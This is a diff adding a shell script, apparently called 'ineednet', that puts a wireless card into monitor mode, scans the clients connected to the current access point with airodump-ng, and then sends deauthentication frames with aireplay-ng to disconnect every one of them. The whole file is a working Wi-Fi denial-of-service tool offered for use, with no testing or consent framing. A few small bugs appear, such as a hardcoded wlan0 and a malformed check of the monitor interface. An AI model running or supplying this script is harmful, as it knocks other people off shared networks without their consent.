@@ -1,0 +1,92 @@
+#!/bin/sh
+
+#Help Message
+usage(){
+cat << EOF
+usage: ineednet [options]
+
+OPTIONS:
+	-h 		show this message
+	-i ifname	use ifname interface for packet injection
+
+EOF
+}
+
+#Check for command line arguments
+if [ $# -gt 0 ]; then
+	#Parse command line arguments if found
+	while getopts ":hi:" OPT; do
+		case "$OPT" in
+			h)
+				usage
+				exit 0
+				;;
+			i)
+				nwinterface=$OPTARG
+				;;
+			:)
+				echo "Option -$OPTARG requires an argument"
+				usage >&2
+				exit 1
+				;;
+			\?)
+				echo "Invalid argument: -$OPTARG"
+				usage >&2
+				exit 1
+				;;
+		esac
+	done
+	#Handle arguments not starting with -
+	if [[ $1 != -* ]]; then
+		echo "Invalid argument: $1"
+		usage >&2
+		exit 1
+	fi
+else
+	nwinterface=`iwgetid | cut -d ' ' -f1`
+fi
+
+#Collect router and network card info
+bssid=`iwgetid -a | cut -d ' ' -f8`
+channel=`iwgetid -c | cut -d ' ' -f6 | cut -c 9-`
+mac=`ip addr show wlan0 | grep 'link/ether' | cut -d ' ' -f6`
+essid=`iwgetid | cut -c 18- | tr -d '\"'`
+
+#Set network card into monitor mode
+echo "Setting your wireless card into monitor mode..."
+airmon-ng start $nwinterface > /dev/null 2>&1
+moninterface=`airmon-ng | grep 'mon' | cut -c1-4`
+if [[ moninterface == mon* ]]; then
+	echo "Success! ($moninterface)"
+else
+	echo "Failed to set your network interface ($nwinterface) into monitor mode! >&2"
+	exit 1
+fi
+
+#Get wireless clients connected to router
+echo "Scanning wireless clients connected to $essid($bssid)..."
+airodump-ng -w temp --output-format csv --bssid $bssid -c $channel $moninterface > /dev/null 2>&1 &
+airpid=`ps -A | grep 'airodump-ng' | awk '{ print $1 }'`
+sleep 30
+kill $airpid
+echo "Scanning completed! Following clients found :"
+ssids=`cut -d ',' -f 1 temp-01.csv | egrep -Evi "^[[:space:]]*$|^#|$mac|BSSID|Station MAC|$bssid"`
+for i in $ssids
+do
+	echo $i
+done
+
+#Send DeAuth signal to the clients found
+echo "Disconnecting clients..."
+for client in $ssids
+do
+	aireplay-ng -0 5 -a $bssid -c $client $moninterface
+done
+
+#Perform cleanup
+echo "Removing temporary files..."
+rm -f temp-01.csv > /dev/null 2>&1 &
+echo "Turning off monitor mode..."
+airmon-ng stop $moninterface > /dev/null 2>&1 &
+
+exit 0
